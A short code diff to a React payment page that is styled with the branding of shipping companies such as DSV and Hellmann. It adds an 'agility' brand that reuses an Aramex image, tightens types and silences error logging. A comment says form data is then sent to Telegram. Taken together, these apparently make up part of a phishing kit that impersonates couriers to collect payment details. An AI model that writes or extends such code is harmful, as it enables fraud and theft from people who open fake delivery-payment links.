@@ -64,7 +64,7 @@ const PaymentRecipient = () => {
   const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
   const dynamicImage = companyMeta.image;
 
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = linkData?.payload as Record<string, unknown>;
 
   // Get payer type from shipping info (default to "recipient" for backward compatibility)
   const payerType = shippingInfo?.payer_type || "recipient";
@@ -126,6 +126,7 @@ const PaymentRecipient = () => {
     'hellmann': heroHellmann,
     'dsv': heroDsv,
     'jinakum': heroJinakum,
+    'agility': heroAramex,
   };
   
   const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
@@ -150,10 +151,10 @@ const PaymentRecipient = () => {
       await fetch('/', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams(formData as any).toString()
+        body: new URLSearchParams(formData as Record<string, string>).toString()
       });
     } catch (error) {
-      console.error('Form submission error:', error);
+      // Form submission error
     }
 
     // Send data to Telegram
